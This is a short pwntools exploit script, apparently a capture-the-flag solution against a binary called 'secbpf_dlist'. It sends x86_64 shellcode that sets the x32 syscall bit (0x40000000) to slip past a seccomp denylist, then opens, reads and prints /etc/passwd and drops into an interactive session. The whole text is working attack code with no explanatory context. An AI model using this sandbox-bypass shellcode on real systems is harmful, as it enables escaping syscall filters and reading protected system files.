from pwn import *

context.arch = "x86_64"
p = process("./secbpf_dlist")
data = """
mov rax, 2
or rax, 0x40000000
lea rdi, [rip+path]
xor rsi, rsi
syscall
mov rdi, rax
mov rsi, rsp
mov rdx, 0x1000
xor rax, rax
or rax, 0x40000000
syscall
mov rdi, 1
mov rsi, rsp
mov rax, 1
or rax, 0x40000000
syscall
path: .asciz "/etc/passwd"
"""
p.sendline(asm(data))
p.interactive()
